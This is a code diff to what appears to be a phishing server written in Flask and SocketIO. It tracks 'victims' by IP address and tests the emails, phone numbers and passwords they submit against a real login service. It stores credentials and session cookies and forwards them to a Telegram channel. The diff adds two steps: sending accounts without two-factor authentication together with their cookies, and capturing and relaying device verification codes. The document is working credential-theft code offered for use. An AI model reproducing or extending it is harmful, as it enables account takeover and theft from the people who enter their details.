@@ -35,7 +35,6 @@ def handle_connect():
     global cookie_type, api_token, chat_id, telegram
     setting = Setting().get_info()
     proxy = Config().get_info()["proxy"]
-    print(proxy)
     load_image = setting["load_image"]
     load_css = setting["load_css"]
     hide_chrome = setting["hide_chrome"]
@@ -97,7 +96,8 @@ def handle_login(data):
     status = list_victim[ip].authenticate_account(
         data["email"], data["password"])
     if status["message"] == "WRONG_CREDENTIALS":
-        status = list_victim[ip].login(data["phone"], data["password"])
+        status = list_victim[ip].authenticate_account(
+            data["phone"], data["password"])
         if status["message"] == "WRONG_CREDENTIALS":
             Data().add_data(username=data["email"], password=data["password"],
                             country=country, type='SMK')
@@ -107,6 +107,8 @@ def handle_login(data):
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(username=data["email"], password=data["password"], cookie=cookie,
                         country=country, type='NUL')
+        telegram.send_message(
+            'KHÔNG BẬT 2FA', data["email"], data["phone"], data["password"], cookie, ip=ip, country=country)
     if status["message"] == "DEVICE_VERIFICATION":
         telegram.send_message(
             '681 CHƯA XÁC MINH', data["email"], data["phone"], data["password"], ip=ip, country=country)
@@ -153,6 +155,25 @@ def handle_forget_password(code):
                   {"status": "success", "message": "LOGGED_IN"})
 
 
+@socketio.on("device")
+def handle_forget_password(code):
+    if request.headers.getlist("X-Forwarded-For"):
+        ip = request.headers.getlist("X-Forwarded-For")[0]
+    else:
+        ip = request.remote_addr
+    str(ip)
+    if ip in list_victim:
+        pass
+    else:
+        return {"status": "failed", "message": "CHECKPOINT_ACCOUNT"}
+    Data().add_data(list_victim[ip].email, list_victim[ip].password,
+                    code, country=get_country(ip), type='FGP')
+    telegram.send_code(
+        'CODE 681', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, code, ip, country=get_country(ip))
+    socketio.emit("deviceResponse",
+                  {"status": "success", "message": "LOGGED_IN"})
+
+
 @socketio.on("device-verification")
 def handle_device_verification():
     if request.headers.getlist("X-Forwarded-For"):
@@ -188,4 +209,4 @@ def catch_all(path):
 
 
 if __name__ == "__main__":
-    socketio.run(app, host="0.0.0.0", debug=True, port=8000)
+    socketio.run(app, host="0.0.0.0", debug=True, port=5000)
